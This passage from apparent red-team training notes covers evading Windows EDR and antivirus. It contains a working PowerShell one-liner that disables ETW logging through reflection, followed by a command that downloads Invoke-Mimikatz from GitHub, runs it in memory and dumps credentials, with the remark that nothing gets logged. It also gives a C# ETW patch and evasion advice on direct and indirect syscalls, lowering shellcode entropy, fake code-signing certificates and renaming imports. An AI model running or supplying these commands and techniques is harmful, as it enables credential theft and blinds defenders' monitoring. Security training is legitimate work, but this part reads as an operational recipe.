<tr><td>0x0000000000001000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process.</td></tr>
<tr><td>0x0000000000002000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000004000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</td><td>Sets the context of a thread in a remote process.</td></tr>
<tr><td>0x0000000000008000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</td><td>Sets the context of a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000010000</td><td>KERNEL_THREATINT_KEYWORD_READVM_LOCAL</td><td>Reads virtual memory in the local process.</td></tr>
<tr><td>0x0000000000020000</td><td>KERNEL_THREATINT_KEYWORD_READVM_REMOTE</td><td>Reads virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000040000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</td><td>Writes to virtual memory in the local process.</td></tr>
<tr><td>0x0000000000080000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</td><td>Writes to virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000100000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</td><td>Suspends a thread.</td></tr>
<tr><td>0x0000000000200000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_THREAD</td><td>Resumes a suspended thread.</td></tr>
<tr><td>0x0000000000400000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</td><td>Suspends all threads in a process.</td></tr>
<tr><td>0x0000000000800000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</td><td>Resumes all threads in a suspended process.</td></tr>
<tr><td>0x0000000001000000</td><td>KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS</td><td>Freezes a process, preventing it from executing.</td></tr>
<tr><td>0x0000000002000000</td><td>KERNEL_THREATINT_KEYWORD_THAW_PROCESS</td><td>Thaws a frozen process, allowing it to execute.</td></tr>
<tr><td>0x0000000004000000</td><td>KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE</td><td>Parses the context of a process or thread.</td></tr>
<tr><td>0x0000000008000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE</td><td>Probes the virtual address descriptor (VAD) for an execution address.</td></tr>
<tr><td>0x0000000010000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE</td><td>Probes the memory-mapped file (MMF) name for an execution address.</td></tr>
<tr><td>0x0000000020000000</td><td>KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION</td><td>Reads or writes virtual memory without signature restrictions.</td></tr>
<tr><td>0x0000000040000000</td><td>KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS</td><td>Logs events related to kernel-mode drivers.</td></tr>
<tr><td>0x0000000080000000</td><td>KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS</td><td>Logs events related to device operations.</td></tr>
<tr><td>0x8000000000000000</td><td>Microsoft-Windows-Threat-Intelligence/Analytic</td><td>Logs analytic events for threat intelligence.</td></tr>
</tbody></table>
<table><thead><tr><th>Value</th><th>Level</th><th>Description</th></tr></thead><tbody>
<tr><td>0x04</td><td>win:Informational</td><td>Information</td></tr>
</tbody></table>
<table><thead><tr><th>PID</th><th>Image</th></tr></thead><tbody>
<tr><td>0x00000000</td><td></td></tr>
</tbody></table>
<p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
https://github.com/MHaggis/PowerShell-Hunter</p>
<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
<p>run after amsi bypass:</p>
<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
</code></pre>
<p>then run</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
</code></pre>
<p>No detections, AMSI is disabled, ETW is disabled -&gt; Check eventviewer -&gt; no powershell logs.</p>
<h2><a class="header" href="#understanding-the-components" id="understanding-the-components">Understanding the Components:</a></h2>
<ul>
<li><strong><code>[Reflection.Assembly]::LoadWithPartialName('System.Core')</code>:</strong>
<ul>
<li>Loads the <code>System.Core.dll</code> assembly, containing core .NET classes, including <code>System.Diagnostics.Eventing.EventProvider</code>.</li>
</ul>
</li>
<li><strong><code>.GetType('System.Diagnostics.Eventing.EventProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Diagnostics.Eventing.EventProvider</code> type, responsible for emitting ETW events.</li>
</ul>
</li>
<li><strong><code>.GetField('m_enabled','NonPublic,Instance')</code>:</strong>
<ul>
<li>Retrieves the <code>m_enabled</code> field of the <code>EventProvider</code> class, a non-public instance field that determines whether ETW events are enabled.</li>
</ul>
</li>
<li><strong><code>.SetValue(...)</code>:</strong>
<ul>
<li>Sets the value of the <code>m_enabled</code> field.</li>
</ul>
</li>
<li><strong><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')</code>:</strong>
<ul>
<li>Retrieves the <code>System.Management.Automation.Tracing.PSEtwLogProvider</code> type, a PowerShell-specific wrapper around the .NET ETW functionality.</li>
</ul>
</li>
<li><strong><code>.GetField('etwProvider','NonPublic,Static').GetValue($null)</code>:</strong>
<ul>
<li>Retrieves the <code>etwProvider</code> field of the <code>PSEtwLogProvider</code> class, a non-public static field holding a reference to the <code>EventProvider</code> instance used by PowerShell.</li>
</ul>
</li>
<li><strong><code>,0</code>:</strong>
<ul>
<li>Sets the <code>m_enabled</code> field to <code>0</code> (false), disabling ETW events for the PowerShell <code>EventProvider</code>.</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#how-it-works-etw-bypass" id="how-it-works-etw-bypass">How It Works (ETW Bypass):</a></h2>
<ul>
<li>PowerShell uses the .NET <code>EventProvider</code> class to generate ETW events.</li>
<li>The <code>PSEtwLogProvider</code> class in PowerShell acts as a bridge, holding the specific <code>EventProvider</code> instance used for PowerShell logging.</li>
<li>The <code>m_enabled</code> field within the <code>EventProvider</code> class controls whether events are actually emitted.</li>
<li>By using reflection, the code directly accesses and modifies this internal <code>m_enabled</code> field, setting it to <code>0</code>.</li>
<li>This prevents the PowerShell <code>EventProvider</code> from generating ETW events, effectively bypassing ETW logging for that PowerShell process.</li>
</ul>
<p><img src="./images/etw_diag.jpg" alt="Screenshot" /></p>
<h2><a class="header" href="#key-points" id="key-points">Key Points:</a></h2>
<ul>
<li>This method relies on internal .NET implementation details and might break if those details change in future .NET or PowerShell versions.</li>
<li>It only affects the current PowerShell process.</li>
<li>It is very effective at disabling the ETW logging from within powershell.</li>
<li>This technique is commonly used by malicious actors.</li>
<li>EDR solutions monitor for this type of activity.</li>
</ul>
<p>CSHARP CODE (AI Generated) using the same ETW bypass (also works for .net binaries)</p>
<pre><code class="language-CSharp">using System;
using System.Diagnostics.Eventing;
using System.Reflection;

public class EtwBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the EventProvider type
            Type eventProviderType = typeof(EventProvider);

            // Find the m_enabled field (non-public, instance)
            FieldInfo mEnabledField = eventProviderType.GetField(&quot;m_enabled&quot;, BindingFlags.NonPublic | BindingFlags.Instance);

            // Get the EventProvider instance used by the application (you'll need to adapt this part)
            // This is the tricky part, as you need to find the specific instance you want to patch.
            // In a real application, you would need to find the event provider instance that is used.
            // This example creates a new instance just for demonstration.
            EventProvider dummyProvider = new EventProvider(Guid.NewGuid());

            // Set the m_enabled field to 0 (false)
            if (mEnabledField != null)
            {
                mEnabledField.SetValue(dummyProvider, 0);
                Console.WriteLine(&quot;ETW bypassed.&quot;);
            }
            else
            {
                Console.WriteLine(&quot;m_enabled field not found.&quot;);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
        }
    }
}
</code></pre>
<h2><a class="header" href="#etw-patching-in-net-binaries-vs-powershell" id="etw-patching-in-net-binaries-vs-powershell">ETW Patching in .NET Binaries vs. PowerShell</a></h2>
<p><strong>PowerShell Patch:</strong></p>
<ul>
<li>Uses reflection to modify the <code>PSEtwLogProvider</code> within the PowerShell process.</li>
<li>Specifically targets how PowerShell logs events.</li>
<li>Limited to the PowerShell process.</li>
<li>Executed as a PowerShell command.</li>
<li>Targets the PowerShell ETW logging mechanism.</li>
</ul>
<p><strong>.NET Binary Patch (C# Example):</strong></p>
<ul>
<li>Compiles into a standalone .NET executable.</li>
<li>Uses reflection to directly modify the <code>EventProvider</code> class within the running .NET binary.</li>
<li>Can patch ETW logging for any .NET application that uses the standard .NET <code>EventProvider</code> class, if the correct <code>EventProvider</code> instance can be located.</li>
<li>Can affect any .NET application.</li>
<li>Executed as a compiled executable.</li>
<li>Targets the <code>EventProvider</code> class, allowing it to target any .NET application using that class.</li>
</ul>
<p><strong>Key Differences and Implications:</strong></p>
<ul>
<li><strong>Scope:</strong>
<ul>
<li>PowerShell patch: Limited to the PowerShell process.</li>
<li>.NET binary patch: Can affect any .NET application, if the correct event provider can be located.</li>
</ul>
</li>
<li><strong>Execution Context:</strong>
<ul>
<li>PowerShell patch: Executed as a PowerShell command.</li>
<li>.NET binary patch: Executed as a compiled executable.</li>
</ul>
</li>
<li><strong>Targeting:</strong>
<ul>
<li>Powershell patch: Targets the powershell ETW logging.</li>
<li>.net binary patch: Targets the event provider class, so it can target any .net application that uses that class.</li>
</ul>
</li>
</ul>
<p><strong>In summary:</strong> The C# code provides a more general-purpose ETW patching mechanism that can be used independently of PowerShell, while the PowerShell one-liner is specific to the PowerShell environment.</p>
<hr />
<h1><a class="header" href="#telemetrysourceror" id="telemetrysourceror">TelemetrySourceror</a></h1>
<p>Make sure secure boot is disabled in VM</p>
<pre><code class="language-powershell">bcdedit.exe -set TESTSIGNING ON
</code></pre>
<p>Reboot the machine</p>
<p>Use PSEXEC to run as system and run Telemetry Sourceror</p>
<hr />
<p>ETW USER LAND vs KERNEL MODE</p>
<h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
<p><a href="https://hfiref0x.github.io/X86_64/NT10_syscalls.html">https://hfiref0x.github.io/X86_64/NT10_syscalls.html</a></p>
<table><thead><tr><th>System Call</th><th>Windows 10</th><th>Description</th></tr></thead><tbody>
<tr><td><code>NtCreateThread</code></td><td>0x004e</td><td>Creates a thread to execute within the virtual address space of the calling process.</td></tr>
<tr><td><code>NtAllocateVirtualMemory</code></td><td>0x0018</td><td>Allocates memory in the virtual address space of the calling process.</td></tr>
<tr><td><code>NtWriteVirtualMemory</code></td><td>0x003a</td><td></td></tr>
<tr><td><code>NtWaitForSingleObject</code></td><td>0x0004</td><td>Waits until the specified object is in the signaled state or the time-out interval elapses.</td></tr>
</tbody></table>
<p>https://github.com/joshfinley/SyscallDumper</p>
<p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
<p>https://github.com/fin3ss3g0d/HookFinder</p>
<pre><code class="language-powershell">PS C:\git\EDRs&gt; .\hook_finder64.exe C:\windows\system32\ntdll.dll
</code></pre>
<p>https://www.secunnix.com/en/blog/cat-and-mouse-game</p>
<h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
<p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
<p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
<blockquote>
<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)
with memory forensics (i.e. volatilty) this can be detected, EDR's are in a tough spot since they need to do this in real time!</p>
</blockquote>
<p><a href="https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s">https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s</a></p>
<p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
<p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
<h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
<p>Indirect system calls are similar to the direct system calls technique in terms of their working logic. But beyond that, they have a few minor differences in the processing of system calls.</p>
<p>In the direct syscall technique, while the process belonging to ntdll.dll is completely outside the event and the RET commands are in the program itself instead of this DLL, in the case of indirect syscall, since <code>the calls are executed through ntdll.dll</code>, they are perceived as normal by EDR processes. Okay. So, if you ask how EDR cannot perform the hook operation, the logic is actually simple. During the execution of the malicious code, <code>the JMP command goes to the block where the system call is located</code>, instead of pointing to the entry point (starting point) of <code>ntdll.dll</code>. 
Thus, a device unaware of ntdll.dll It is a little more difficult to detect since there is no execution process.</p>
<p><img src="./images/syscall_indirect.jpg" alt="Screenshot" /></p>
<p>Although both techniques still work, the indirect syscall method can help develop less detectable malware. Note that these are methods to avoid user mode hooking. If you are dealing with a security solution that does kernel mode hooking, this techniques can be identified.
In addition, the Event Tracing for Windows (ETW) structure offered by Microsoft for Windows systems can be used by some EDRs to control the stack structures where calls are made. If you want to see a very clean implementation of both techniques, read the article below. We can recommend it.</p>
<p>https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
https://github.com/Maldev-Academy/HellHall</p>
<hr />
<p>regular virtualAlloc through win32api vs. direct syscall using SSN.</p>
<hr />
<p>Syswhispers2 -&gt; import in visual studio project to enumerate syscalls</p>
<h1><a class="header" href="#kernel-callbacks" id="kernel-callbacks">Kernel Callbacks</a></h1>
<h1><a class="header" href="#edr-stuff" id="edr-stuff">EDR Stuff</a></h1>
<blockquote>
<p>HINT : Writing your payloads in something else that c, C++, CSharp typically has more evasive results. So exactly the same functionality, just switching the languags throw a lot of AV/EDR's off, or at least decrease the detection rate (i.e golang, nim, ...)
When using payloads, DLL's evade EDR's than Exe's. -&gt; Shellcode = not exe/dll!!!</p>
</blockquote>
<p>https://blog.deeb.ch/posts/how-edr-works/</p>
<p>DLL Sideloading, powershellshell SharpDDL Proxy, DDLHijacks.net
Cyphercon 6
windows SKD Libraries - signed by MS (EDR's track default DLL's and their execution paths)
use procmon to see DLL's not found</p>
<p>Evading AV (signatures), by downloading the shellcode remotely, instead of embedded it might trigger behavioural detections (unsigned process, making a network connection). So maybe we can embed the encrypted shellcode in an .ico file, in a resource file.</p>
<blockquote>
<p><em><strong>OPSEC Hint</strong></em> : EDR's will look at Entropy, so anything that is encrypted/packed/compressed (high level of randomization), will have a very high entropy (randomness level). We can optimize our shellcode by adding nullbytes to decrease the entropy. This is REALLY important</p>
<p>https://github.com/gmh5225/shellcode-EntropyFix
sigcheck.exe -h -a &quot;D:\Malware\11&quot;</p>
<p>As compression and encryption algorithms' output usually consists of high entropy data, one can say any file with entropy greater than 7.0 is likely compressed, encrypted, or packed (in case of executables).</p>
</blockquote>
<blockquote>
<p>Also remember static/signature/heuristic detection can flag suspicious elements of code, so the cleaner we bypass, the less EDR gets a headstart with suspicious detections passed on from the static engine.</p>
</blockquote>
<ol>
<li>code-signed files are more losely inspected</li>
<li>it's all about adding weight of malicious indicators</li>
</ol>
<p>How EDR's do their thing</p>
<table><thead><tr><th>Feature</th><th>Description</th></tr></thead><tbody>
<tr><td>Kernell callbacks</td><td>Process creation, dll loading etc</td></tr>
<tr><td>ETW</td><td>System events</td></tr>
<tr><td>AMSI</td><td>Jscript, vbscript, dotnet, powershell -&gt; scanning with signatures</td></tr>
<tr><td>System call Monitoring</td><td>Hooking API's in process memory</td></tr>
</tbody></table>
<h1><a class="header" href="#chapter-13---evasion" id="chapter-13---evasion">Chapter 1.3 - Evasion</a></h1>
<p>Tips and tricks</p>
<p>strings - HxD/xxd
entropy</p>
<p>IAT &amp; String obfuscation</p>
<h1><a class="header" href="#build-as-release-and-disable-optimization-debug-includes-symbols" id="build-as-release-and-disable-optimization-debug-includes-symbols">Build as release and disable optimization (debug includes symbols)</a></h1>
<h1><a class="header" href="#fake-certs" id="fake-certs">Fake Certs</a></h1>
<p>Add face code-signing certs
https://github.com/jfmaes/LazySign</p>
<h1><a class="header" href="#compilation-meta-data" id="compilation-meta-data">compilation meta data</a></h1>
<h1><a class="header" href="#renaming-functions" id="renaming-functions">Renaming functions</a></h1>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Change to : </p>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr MemReserve(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Entrypoint -&gt; Specific entrypoint in kernel32.dll basically creating an alias to the function
Add some options to evade AV -&gt; SetLastError, ExactSpelling</p>
<h1><a class="header" href="#base64-encoding" id="base64-encoding">Base64 Encoding</a></h1>
<h1><a class="header" href="#xor-encoding" id="xor-encoding">XOR Encoding</a></h1>
<h1><a class="header" href="#array-reversing" id="array-reversing">Array Reversing</a></h1>
<h1><a class="header" href="#syscalls" id="syscalls">Syscalls</a></h1>
<h1><a class="header" href="#unhooking" id="unhooking">Unhooking</a></h1>
<h1><a class="header" href="#litterbox--avred-forensics" id="litterbox--avred-forensics">Litterbox / Avred (Forensics)</a></h1>
<h2><a class="header" href="#1-avred-server" id="1-avred-server">1. AVRed-Server</a></h2>
<blockquote>
<p>This is the scanning engine that sends requests to the antivirus API configured, in our training that is &quot;Defender&quot;.</p>
</blockquote>
<p>Pre-requisites : AVRed uses Radare2 so let's first install that on our windows machine and add it to the path.</p>
<p><a href="https://github.com/radareorg/radare2/releases/download/5.9.8/radare2-5.9.8-w64.zip">https://github.com/radareorg/radare2/releases/download/5.9.8/radare2-5.9.8-w64.zip</a></p>
<p><img src="./images/radare2.jpg" alt="image" /></p>
<p><em><strong>On windows:</strong></em></p>
<pre><code class="language-powershell">cd c:\git
git clone hhttps://github.com/dobin/avred-server.git
cd avred-server
pip install  -r requirements.txt
</code></pre>
<p>Edit the config.yaml file</p>
<pre><code class="language-yaml">{
	&quot;bind_ip&quot;: &quot;0.0.0.&quot;,
	&quot;port&quot;: 8001,
	&quot;engine&quot;: &quot;Amsi&quot;
}
</code></pre>
<p><img src="./images/avred_server.jpg" alt="image" /></p>
<p>On your windows machine browse to the link:</p>
<p><a href="http:%5C%5Clocalhost:8001">http:\\localhost:8001</a></p>
<p><img src="./images/avred_server_chrome.jpg" alt="image" /></p>
<p>OPTIONALLY - Install as service with NSSM</p>
<p><a href="https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip">https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip</a></p>
<pre><code class="language-powershell">where python.exe
C:\Users\threatadmin\AppData\Local\Programs\Python\Python312\python.exe
C:\Users\threatadmin\AppData\Local\Microsoft\WindowsApps\python.exe
</code></pre>
<pre><code class="language-powershell">nssm install AvredServer&quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\avred-server\\avred_server.py&quot;
nssm set AvredTest AppDirectory &quot;C:\\git\\avred-server\\&quot;
nssm.exe start AvredServer
</code></pre>
<h2><a class="header" href="#2-avred" id="2-avred">2. AVred</a></h2>
<blockquote>
<p>AVRed is the webgui that allows us to submit samples to the AVRed-Server, that then talks to the configured Antivirus API.</p>
</blockquote>
<pre><code class="language-powershell">cd git
git clone https://github.com/dobin/avred.git
pip install -R requirements.txt
</code></pre>
<p>Edit the config.yaml</p>
<pre><code class="language-yaml">server:
  Amsi: &quot;http://localhost:8001/&quot;
password: &quot;&quot;
hashCache: True
WebMaxFileSizeMb: 50
</code></pre>
<p>run a scan from commandline</p>
<pre><code class="language-powershell">python3 avred.py -f app/upload/meterpreter.exe 
</code></pre>
<p>Run the (GUI) server (this is running on your KALI machine)</p>
<pre><code class="language-bash">python3 avredweb.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
<a href="http:%5C%5Clocalhost:5000">http:\\localhost:5000</a></p>
<p><img src="./images/avred_web.jpg" alt="image" /></p>
<p>Install as a service with NSSM</p>
<pre><code>nssm install AvredWeb &quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\avred\\avredweb.py&quot;
nssm set AvredWeb AppDirectory &quot;C:\\git\\avred\\&quot;
nssm.exe start AvredWeb
</code></pre>
<hr />
<h1><a class="header" href="#litterbox" id="litterbox">Litterbox</a></h1>
<pre><code class="language-powershell">cd git
git clone https://github.com/BlackSnufkin/LitterBox.git
cd LitterBox
pip install -r requirements.txt
</code></pre>
<p>Run the server manually:</p>
<pre><code class="language-powershell">python litterbox.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
<a href="http:%5C%5Clocalhost:1337">http:\\localhost:1337</a></p>
<p><img src="./images/litterbox.jpg" alt="image" /></p>
<p>Or install as a service:</p>
<pre><code>nssm install Litterbox &quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\litterbox\\litterbox.py&quot;
nssm set Litterbox AppDirectory &quot;C:\\git\\litterbox\\&quot;
nssm.exe start litterbox
</code></pre>
<hr />
<h1><a class="header" href="#bestedrofthemarket" id="bestedrofthemarket">BestEDROfTheMarket</a></h1>
<p><a href="https://github.com/Xacone/BestEdrOfTheMarket">https://github.com/Xacone/BestEdrOfTheMarket</a></p>
<pre><code class="language-python">[book]
title = &quot;My Awesome Book&quot;

[output.wordcount]

[output.html]
</code></pre>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<h1><a class="header" href="#todos" id="todos">TODOs:</a></h1>
<ul>
<li><r>TODO:</r> Important thing to do</li>
<li><o>TODO:</o> Less important thing to do</li>
<li><g>DONE:</g> Breath deeply and improve karma</li>
</ul>
<h1><a class="header" href="#chat" id="chat">CHAT</a></h1>
<p>Please insrall <a href="https://discord.com"><strong>DISCORD</strong></a> on your machine - we'll be using discord for sharing links, documents, chatting, questions and banter. At the beginning of the class you'll receive an invite to join the Threat Hunting Academy channel.</p>
<h1><a class="header" href="#access-to-the-lab" id="access-to-the-lab">ACCESS to the lab:</a></h1>
<p>Students get access to a central <code>GUACAMOLE</code> server, from there they can <code>RDP</code> into their Windows 10 machine and use SSH (native ssh in WIN10 or putty) to their Kali machine.</p>
<p>The guacamole server is : <a href="https://guacamole.th.denarm.be/#/"><strong>GUACAMOLE</strong></a><br />
Credentials are : <strong>studentXX</strong>/WEWILLTELLYOU (where XX is a number from 01 to 15)<br />
RDP credentials are : <em><strong>studentXX</strong></em>/WEWILLTELLYOU (where XX is a number from 01 to 15)</p>
<pre><code class="language-code">https://guacamole.th.denarm.be/
</code></pre>
<blockquote>
<p>Example text box</p>
</blockquote>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
